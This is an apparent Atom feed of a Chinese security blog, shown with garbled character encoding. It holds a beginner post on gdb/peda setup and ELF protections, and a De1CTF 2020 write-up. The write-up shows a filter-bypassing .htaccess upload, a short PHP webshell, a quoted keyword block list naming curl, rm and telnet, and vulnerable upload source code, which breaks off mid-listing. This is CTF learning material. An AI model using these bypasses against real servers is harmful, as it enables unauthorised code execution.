<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ggb0n&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ggb0n.cool/"/>
  <updated>2020-05-13T09:19:56.401Z</updated>
  <id>http://ggb0n.cool/</id>
  
  <author>
    <name>ggb0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å…¥å‘äºŒè¿›åˆ¶</title>
    <link href="http://ggb0n.cool/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    <id>http://ggb0n.cool/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/</id>
    <published>2020-05-13T02:30:44.000Z</published>
    <updated>2020-05-13T09:19:56.401Z</updated>
    
    <content type="html"><![CDATA[<p>ä½œä¸ºä¸€åWEBèœç‹—ï¼Œä»Šå¤©å†³å®šå…¥å‘äºŒè¿›åˆ¶äº†ï¼Œå‡ºäºæå¤§çš„å¥½å¥‡å¿ƒå’Œæ±‚çŸ¥æ¬²ï¼ˆå…¶å®å°±æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œæ€¥éœ€æ‹“å±•çŸ¥è¯†å•Š~ï¼‰ï¼ŒåŠ ä¸Šä¹Ÿæœ‰äº›è®¡ç®—æœºåŸç†çš„ä¸€äº›åŸºç¡€ï¼Œæƒ³ç€ä¸èƒ½æŠŠå­¦çš„ä¸œè¥¿ç»™åºŸæ‰ã€æ‰”æ‰ï¼Œæ‰€ä»¥å†³å®šå…¥å‘ï¼<a id="more"></a></p><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><h4 id="1ã€å®‰è£…gdbå’Œæ’ä»¶pada"><a href="#1ã€å®‰è£…gdbå’Œæ’ä»¶pada" class="headerlink" title="1ã€å®‰è£…gdbå’Œæ’ä»¶pada"></a>1ã€å®‰è£…gdbå’Œæ’ä»¶pada</h4><p>ä»åŸºç¡€åšèµ·ï¼Œå®‰è£…<code>gdb</code>ä»¥åŠå…¶æ’ä»¶<code>pada</code></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install gdb</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½è¿˜éœ€è¦å®‰è£…ä¸€äº›åº“ï¼Œä¾æ®éœ€è¦å®‰è£…å³å¯ï¼Œä¹‹åå®‰è£…æ’ä»¶<code>pada</code>ï¼ŒäºŒè¿›åˆ¶å¿…å¤‡æ’ä»¶</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/longld/peda.git ~/peda</span><br></pre></td></tr></table></figure><p>gitæŠŠåº“æ‹‰ä¸‹æ¥ä¹‹åï¼ŒæŠŠ<code>source ~/peda/peda.py</code> å†™å…¥<code>~/.gdbinit</code></p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~<span class="string">/.gdbinit</span></span><br></pre></td></tr></table></figure><blockquote><p>è£…<code>pada</code>çš„æ—¶å€™ä¹Ÿæœ‰ç”¨pipè£…çš„ï¼Œä½†æ˜¯å¯èƒ½å¯¼è‡´gdbç‰ˆæœ¬ä¸pythonç‰ˆæœ¬ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå¦‚æœgdbè‡ªåŠ¨ç»‘å®špython3çš„è¯ï¼Œç›´æ¥pipä¸‹æ¥çš„padaç”¨ç€ä¼šæŠ¥é”™ã€‚</p></blockquote><p>å®‰è£…å®Œæ¯•ï¼Œæµ‹è¯•ï¼š</p><p><img src="http://ggb0n.cool/images/pada.png" alt=""></p><h4 id="2ã€å®‰è£…checksec"><a href="#2ã€å®‰è£…checksec" class="headerlink" title="2ã€å®‰è£…checksec"></a>2ã€å®‰è£…checksec</h4><p><code>checksec</code>å¯ä»¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶å¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶ï¼Œæ˜¯ç©äºŒè¿›åˆ¶ä¸å¯ç¼ºå°‘çš„å·¥å…·ã€‚ä¸Šä¸€æ­¥è£…çš„padaæ’ä»¶é‡Œå…¶å®æ˜¯åŒ…å«<code>checksec</code>çš„ï¼Œä½†æ˜¯ç‰ˆæœ¬æ¯”è¾ƒä¹…ã€‚å¯ä»¥è‡ªå·±å®‰è£…ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆæ§åˆ¶é«˜ç‰ˆæœ¬</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/slimm609/checksec.<span class="keyword">sh</span>.git</span><br><span class="line"><span class="keyword">cd</span> checksec.<span class="keyword">sh</span></span><br><span class="line">sudo <span class="keyword">ln</span> â€“<span class="keyword">sf</span> checksec /usr/bin/checksec</span><br></pre></td></tr></table></figure><p>å¦‚æœè£…çš„æœ‰æ—§ç‰ˆçš„<code>checksec</code>ï¼Œæ­¤æ—¶åˆ›å»ºè½¯é“¾æ¥å¯èƒ½ä¼šå¤±è´¥ï¼Œè€Œä¸”å°±ç®—åˆ›å»ºæˆåŠŸï¼Œå¯åŠ¨<code>checksec</code>æ£€æŸ¥å¯èƒ½è¿˜æ˜¯æ—§ç‰ˆï¼Œå› ä¸ºå¹¶æ²¡æœ‰è¿›è¡Œæ‰€æœ‰çš„æ›¿æ¢ï¼š</p><p><img src="http://ggb0n.cool/images/check2.png" alt=""></p><blockquote><p> è¿™é‡Œçš„<code>Arch</code>æ˜¯ç¨‹åºæ¶æ„ä¿¡æ¯ï¼Œå¯ä»¥å¾—çŸ¥ç¨‹åºæ˜¯64ä½è¿˜æ˜¯32ä½çš„ï¼Œæœ‰åŠ©äºä¸ºç¼–å†™expæä¾›ä¿¡æ¯ã€‚å…¶ä»–çš„å†…å®¹å°±æ˜¯ä¿æŠ¤æœºåˆ¶å¼€å¯çš„æƒ…å†µäº†ï¼Œåé¢æ·±å…¥å­¦ä¹ ã€‚</p></blockquote><p>æœ‰æ•ˆåŠæ³•æ˜¯å…ˆæ‰¾ä¸€ä¸‹æ—§ç‰ˆçš„æ–‡ä»¶éƒ½å­˜åœ¨å“ªäº›æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œç”¨<code>find / -name checksec</code>å‘½ä»¤æŸ¥æ‰¾ï¼š</p><p><img src="http://ggb0n.cool/images/check3.png" alt=""></p><p>ç„¶åå…¨éƒ¨æ›¿æ¢ï¼Œå†æ¬¡æµ‹è¯•ï¼š</p><p><img src="http://ggb0n.cool/images/check1.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°æ–°ç‰ˆä¼šè¿›è¡Œæ›´å¤šçš„ä¿æŠ¤æœºåˆ¶çš„æµ‹è¯•ã€‚</p><p>ç”±äº<code>pada</code>å†…ç½®æœ‰æ—§ç‰ˆçš„<code>checksec</code>ï¼ˆè·Ÿå‰é¢æ›¿æ¢çš„æ—§ç‰ˆä¸æ˜¯åŒä¸€ä¸ªï¼‰ï¼Œåœ¨ç”¨gdbè°ƒè¯•ä¹‹å‰è¿›è¡Œæ£€æµ‹çš„è¯ï¼Œä»ç„¶æ˜¯æ—§ç‰ˆï¼š</p><p><img src="http://ggb0n.cool/images/check4.png" alt=""></p><p>ä¸¤ä¸ªç‰ˆæœ¬å…±å­˜ï¼Œä¹ŸæŒºå¥½~</p><h3 id="æµ…å­¦ELFä¿æŠ¤æœºåˆ¶"><a href="#æµ…å­¦ELFä¿æŠ¤æœºåˆ¶" class="headerlink" title="æµ…å­¦ELFä¿æŠ¤æœºåˆ¶"></a>æµ…å­¦ELFä¿æŠ¤æœºåˆ¶</h3><p>ä¸Šä¸€èŠ‚æåˆ°äº†æ£€æŸ¥æ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ï¼Œè¿™ä¸€èŠ‚å°±è®°å½•ä¸€ä¸‹Linuxæ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ç›¸å…³çŸ¥è¯†ï¼Œä»¥åçš„å­¦ä¹ å…ä¸äº†éƒ½ä¼šé‡åˆ°ã€‚</p><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p><code>Relocation Read Only</code>ï¼Œ é‡å®šä½è¡¨åªè¯»ã€‚é‡å®šä½è¡¨å³<code>.got</code>å’Œ<code>.plt</code>ä¸¤ä¸ªè¡¨ã€‚æ­¤é¡¹æŠ€æœ¯ä¸»è¦é’ˆå¯¹ GOT æ”¹å†™çš„æ”»å‡»æ–¹å¼ï¼Œåˆ†ä¸ºä¸¤ç§ï¼š<code>Partial RELRO</code>å’Œ<code>Full RELRO</code>ã€‚<br><code>Partical RELRO</code>æ˜“å—åˆ°æ”»å‡»ï¼Œä¾‹å¦‚æ”»å‡»è€…å¯ä»¥<code>atoi.got</code>ä¸º<code>system.plt</code>ï¼Œè¿›è€Œè¾“å…¥<code>/bin/sh\x00</code>è·å¾—<code>shell</code>ã€‚<code>Full RELRO</code>ä½¿æ•´ä¸ª<code>GOT</code>åªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚</p><h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h4><p><code>Canary</code>æ˜¯é‡‘ä¸é›€çš„æ„æ€ï¼ŒæŠ€æœ¯ä¸Šè¡¨ç¤ºæœ€å…ˆçš„æµ‹è¯•çš„æ„æ€ã€‚è¿™ä¸ªæ¥è‡ªä»¥å‰æŒ–ç…¤çš„æ—¶å€™ï¼ŒçŸ¿å·¥éƒ½ä¼šå…ˆæŠŠé‡‘ä¸é›€æ”¾è¿›çŸ¿æ´ï¼Œæˆ–è€…æŒ–ç…¤çš„æ—¶å€™ä¸€ç›´å¸¦ç€é‡‘ä¸é›€ã€‚é‡‘ä¸é›€å¯¹ç”²çƒ·å’Œä¸€æ°§åŒ–ç¢³æµ“åº¦æ¯”è¾ƒæ•æ„Ÿï¼Œä¼šå…ˆæŠ¥è­¦ã€‚æ‰€ä»¥å¤§å®¶éƒ½ç”¨<code>canary</code>æ¥ææœ€å…ˆçš„æµ‹è¯•ã€‚<code>stack canary</code>è¡¨ç¤ºæ ˆçš„æŠ¥è­¦ä¿æŠ¤ã€‚</p><p>åœ¨å‡½æ•°è¿”å›å€¼ä¹‹å‰æ·»åŠ çš„ä¸€ä¸²éšæœºæ•°ï¼ˆä¸è¶…è¿‡æœºå™¨å­—é•¿ï¼‰ï¼Œæœ«ä½ä¸º<code>/x00</code>ï¼ˆæä¾›äº†è¦†ç›–æœ€åä¸€å­—èŠ‚è¾“å‡ºæ³„éœ²<code>canary</code>çš„å¯èƒ½ï¼‰ï¼Œå¦‚æœå‡ºç°ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œè¦†ç›–å†…å®¹è¦†ç›–åˆ°<code>canary</code>å¤„ï¼Œå°±ä¼šæ”¹å˜åŸæœ¬è¯¥å¤„çš„æ•°å€¼ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°æ­¤å¤„æ—¶ï¼Œä¼šæ£€æŸ¥<code>canary</code>å€¼æ˜¯å¦è·Ÿå¼€å§‹çš„å€¼ä¸€æ ·ï¼Œå¦‚æœä¸ä¸€æ ·ï¼Œç¨‹åºä¼šå´©æºƒï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤è¿”å›åœ°å€çš„ç›®çš„ã€‚</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p><code>Non-Executable Memory</code>ï¼Œä¸å¯æ‰§è¡Œå†…å­˜ã€‚<code>NXï¼ˆDEPï¼‰</code>çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸º<code>ä¸å¯æ‰§è¡Œ</code>ï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥<code>shellcode</code>æ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚æ ˆæº¢å‡ºçš„æ ¸å¿ƒå°±æ˜¯é€šè¿‡å±€éƒ¨å˜é‡è¦†ç›–è¿”å›åœ°å€ï¼Œç„¶ååŠ å…¥shellcodeï¼Œ<code>NX</code>ç­–ç•¥æ˜¯ä½¿æ ˆåŒºåŸŸçš„ä»£ç æ— æ³•æ‰§è¡Œã€‚</p><p>ç»•è¿‡è¿™ç±»ä¿æŠ¤æœ€å¸¸è§çš„æ–¹æ³•ä¸º<code>ROP(Return-Oriented Programmingï¼Œè¿”å›å¯¼å‘ç¼–ç¨‹)</code>ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºåœ¨æ ˆä¸Šå¸ƒç½®åœ°å€ï¼Œæ¯ä¸ªå†…å­˜åœ°å€å¯¹åº”ä¸€ä¸ª<code>gadget</code>ï¼Œåˆ©ç”¨<code>ret</code>ç­‰æŒ‡ä»¤è¿›è¡Œè¡”æ¥æ¥æ‰§è¡ŒæŸé¡¹åŠŸèƒ½ï¼Œæœ€ç»ˆè¾¾åˆ°pwnæ‰ç¨‹åºçš„ç›®çš„ã€‚</p><p>çœ‹åˆ°ç½‘ä¸Šå¸ˆå‚…è¯´ï¼šå½“<code>NX</code>ä¿æŠ¤å¼€å¯ï¼Œå°±è¡¨ç¤ºé¢˜ç›®ç»™äº†<code>systemï¼ˆ&#39;/bin/sh&#39;ï¼‰</code>ï¼Œå¦‚æœå…³é—­ï¼Œè¡¨ç¤ºä½ éœ€è¦å»æ„é€ <code>shellcode</code>ã€‚è¿™ä¸ªæ…¢æ…¢å­¦å§ã€‚</p><h4 id="ALSR"><a href="#ALSR" class="headerlink" title="ALSR"></a>ALSR</h4><p><code>Address space layout randomization</code>ï¼Œåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ã€‚æ˜¯ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å¯¹å †ã€æ ˆã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–å°†æ•°æ®éšæœºæ”¾ç½®ï¼Œå¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚</p><p>ä½†æ˜¯åœ°å€éšæœºåŒ–ä¸æ˜¯å¯¹æ‰€æœ‰æ¨¡å—å’Œå†…å­˜åŒºéƒ½è¿›è¡ŒéšæœºåŒ–ï¼Œè™½ç„¶<code>libc</code>ã€<code>æ ˆ</code>ã€<code>å †</code>çš„åŠ è½½ä½ç½®è¢«éšæœºåŒ–ï¼Œä½†ä¸»é•œåƒä¸ä¼šï¼Œè¿™ä¹Ÿæ˜¯ç»•è¿‡çš„å…³é”®æ‰‹æ®µã€‚</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p><code>Position-Independent Executable</code>ï¼Œ ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸<code>ASLR</code>æŠ€æœ¯ç±»ä¼¼ï¼Œ<code>ASLR</code>å°†ç¨‹åºè¿è¡Œæ—¶çš„å †æ ˆä»¥åŠå…±äº«åº“çš„åŠ è½½åœ°å€éšæœºåŒ–, è€Œ<code>PIE</code>æŠ€æœ¯åˆ™åœ¨ç¼–è¯‘æ—¶å°†ç¨‹åºç¼–è¯‘ä¸ºä½ç½®æ— å…³, å³ç¨‹åºè¿è¡Œæ—¶å„ä¸ªæ®µï¼ˆå¦‚ä»£ç æ®µç­‰ï¼‰åŠ è½½çš„è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯åœ¨è£…è½½æ—¶æ‰ç¡®å®šã€‚</p><p>è¿™å°±æ„å‘³ç€ï¼Œ åœ¨<code>PIE</code>å’Œ<code>ASLR</code>åŒæ—¶å¼€å¯çš„æƒ…å†µä¸‹ï¼Œ æ”»å‡»è€…å°†å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€æ— æ‰€çŸ¥ï¼Œ ä¼ ç»Ÿçš„æ”¹å†™<code>GOT</code>è¡¨é¡¹çš„æ–¹æ³•ä¹Ÿéš¾ä»¥è¿›è¡Œï¼Œ å› ä¸ºæ”»å‡»è€…ä¸èƒ½è·å¾—ç¨‹åºçš„<code>.got</code>æ®µçš„è™šåœ°å€ã€‚</p><h4 id="RPATH-RUNPATH"><a href="#RPATH-RUNPATH" class="headerlink" title="RPATH/RUNPATH"></a>RPATH/RUNPATH</h4><p>ç¨‹åºè¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œè¿è¡Œæ—¶æ‰€éœ€è¦çš„å…±äº«åº“æ–‡ä»¶ä¼˜å…ˆä»è¯¥ç›®å½•å¯»æ‰¾ï¼Œå¯ä»¥<code>fake lib</code>é€ æˆæ”»å‡»ã€‚å‚è€ƒ<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.contextis.com%2Fen%2Fblog%2Flinux-privilege-escalation-via-dynamically-linked-shared-object-library">å®ä¾‹</a>ã€‚</p><h4 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h4><p>ç”±GCCå®ç°çš„æºç çº§åˆ«çš„ä¿æŠ¤æœºåˆ¶ï¼Œå…¶åŠŸèƒ½æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥æºç ä»¥é¿å…æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚åŠ äº†è¿™ä¸ªä¿æŠ¤ä¹‹å,ä¸€äº›æ•æ„Ÿå‡½æ•°å¦‚<code>read</code>, <code>fgets,memcpy</code>, <code>printf</code>ç­‰ç­‰å¯èƒ½å¯¼è‡´æ¼æ´å‡ºç°çš„å‡½æ•°éƒ½ä¼šè¢«æ›¿æ¢æˆ<code>\__read_chk</code>ï¼Œ<code>\__fgets_chk</code>ï¼Œ<code>\__memcpy_chk</code>ï¼Œ<code>__printf_chk</code>ç­‰ã€‚</p><p>è¿™äº›å¸¦äº†<code>chk</code>çš„å‡½æ•°ä¼šæ£€æŸ¥è¯»å–/å¤åˆ¶çš„å­—èŠ‚é•¿åº¦æ˜¯å¦è¶…è¿‡ç¼“å†²åŒºé•¿åº¦ï¼Œé€šè¿‡æ£€æŸ¥è¯¸å¦‚<code>%n</code>ä¹‹ç±»çš„å­—ç¬¦ä¸²ä½ç½®æ˜¯å¦ä½äºå¯èƒ½è¢«ç”¨æˆ·ä¿®æ”¹çš„å¯å†™åœ°å€ï¼Œé¿å…äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²è·³è¿‡æŸäº›å‚æ•°ï¼ˆå¦‚ç›´æ¥<code>%7$x</code>ï¼‰ç­‰æ–¹å¼æ¥é¿å…æ¼æ´å‡ºç°ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯äº†è§£åˆ°çš„PWNä¸­å¸¸è§çš„ELFæ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶äº†ï¼Œä»¥åå­¦ä¹ è¿‡ç¨‹ä¸­é€æ­¥æ·±å…¥äº†è§£ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä½œä¸ºä¸€åWEBèœç‹—ï¼Œä»Šå¤©å†³å®šå…¥å‘äºŒè¿›åˆ¶äº†ï¼Œå‡ºäºæå¤§çš„å¥½å¥‡å¿ƒå’Œæ±‚çŸ¥æ¬²ï¼ˆå…¶å®å°±æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œæ€¥éœ€æ‹“å±•çŸ¥è¯†å•Š~ï¼‰ï¼ŒåŠ ä¸Šä¹Ÿæœ‰äº›è®¡ç®—æœºåŸç†çš„ä¸€äº›åŸºç¡€ï¼Œæƒ³ç€ä¸èƒ½æŠŠå­¦çš„ä¸œè¥¿ç»™åºŸæ‰ã€æ‰”æ‰ï¼Œæ‰€ä»¥å†³å®šå…¥å‘ï¼
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶" scheme="http://ggb0n.cool/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶" scheme="http://ggb0n.cool/tags/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF2020éƒ¨åˆ†é¢˜è§£</title>
    <link href="http://ggb0n.cool/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://ggb0n.cool/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-02T02:07:36.000Z</published>
    <updated>2020-05-13T09:18:54.220Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªæ¯”èµ›å¤ªè€ƒå·¥ä½œé‡ï¼Œä¸ªäººæ„Ÿè§‰çŸ¥è¯†é‡ä¹Ÿæ¯”è¾ƒå¤§ï¼Œå¦å¤–De1taçš„å¸ˆå‚…ä»¬åŸæ¥è¿™ä¹ˆçˆ±ç©MCå•ŠğŸ¤”ï¼Œå†™ä¸€ä¸‹å‡ ä¸ªé¢˜çš„é¢˜è§£ï¼Œä¸»è¦è®°å½•ä¸€ä¸‹å­¦åˆ°çš„ä¸œè¥¿ã€‚<a id="more"></a></p><h3 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h3><p>è€ƒå¯Ÿä¸Šä¼ ç»•è¿‡ï¼Œä¸€æ˜¯åœ¨ä¸Šä¼ <code>.htaccess</code>æ—¶å¯¹å…³é”®å­—è¿›è¡Œç»•è¿‡ï¼ŒäºŒæ˜¯åœ¨ä¼ é©¬æ—¶å¯¹<code>&lt;?php</code>è¿›è¡Œç»•è¿‡</p><h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œéšä¾¿ä¸Šä¼ ä¸ª<code>php</code>çš„å°é©¬ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf2.png" alt=""></p><p>phpçš„åç¼€æ—¢ç„¶ä¸è¡Œï¼Œé‚£åº”è¯¥å°±æ˜¯å›¾ç‰‡é©¬äº†ï¼Œå…«æˆæ˜¯è¦ç”¨<code>.htaccess</code>è§£æï¼Œçœ‹ä¸€ä¸‹å“åº”å¤´ä¸­æœåŠ¡å™¨çš„æ¶æ„ï¼š<code>Apache/2.4.6 (CentOS) PHP/5.4.16</code>ï¼ŒåŸºæœ¬æ˜¯ç¡®å®æ˜¯ä¼ <code>.htaccess</code>äº†</p><p>æ„é€ <code>.htaccess</code>å°†<code>jpg</code>è¿›è¡Œè§£æï¼š</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹åå›æ˜¾å¦‚ä¸‹ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf1.png" alt=""></p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">perl|<span class="string">pyth</span>|<span class="string">ph</span>|<span class="string">auto</span>|<span class="string">curl</span>|<span class="string">base</span>|<span class="string">&gt;</span>|<span class="string">rm</span>|<span class="string">ruby</span>|<span class="string">openssl</span>|<span class="string">war</span>|<span class="string">lua</span>|<span class="string">msf</span>|<span class="string">xter</span>|telnet</span><br></pre></td></tr></table></figure><p>è¿™äº›å­—æ®µè¢«banäº†ï¼Œä¸è¿‡<code>.htaccess</code>ä¸­å¯ä»¥ç”¨pythonæ¢è¡Œæ—¶å€™ä¸€ç§è§£æè¯­æ³•ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">AddType</span> <span class="string">application/x-httpd-p\</span></span><br><span class="line"><span class="attr">hp</span> <span class="string">.jpg</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ çš„æ—¶å€™æ³¨æ„æ”¹<code>Content-Type</code>ï¼Œå¦‚å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf3.png" alt=""></p><p>å¦‚æ­¤ä¾¿å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œç„¶åä¼ <code>jpg</code>çš„å›¾ç‰‡é©¬å°±è¡Œäº†ï¼Œæ³¨æ„å›¾ç‰‡é©¬é‡Œçš„<code>&lt;?php</code>æ ‡ç­¾ä¹Ÿéœ€è¦ç»•è¿‡ï¼Œå¯ä»¥ç”¨<code>&lt;?=</code>ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf4.png" alt=""></p><p>ä¸Šä¼ å°é©¬ä¹‹åï¼Œæ‹¿åˆ°æ–‡ä»¶è·¯å¾„ï¼Œä¼ <code>system(&quot;cat /flag&quot;);</code>å³å¯æ‹¿åˆ°flagã€‚</p><h3 id="Hard-present-1"><a href="#Hard-present-1" class="headerlink" title="Hard_present_1"></a>Hard_present_1</h3><p>è€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ åˆ©ç”¨NTFSæµç»•è¿‡æ–‡ä»¶åæ£€æµ‹ã€æ— å­—æ¯æ•°å­—shellæ„é€ ã€åŸŸæ¸—é€</p><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºå¦‚ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Clear the uploads directory every hour</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$sandbox = <span class="string">"uploads/"</span>. md5(<span class="string">"De1CTF2020"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">"submit"</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not Allow!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span 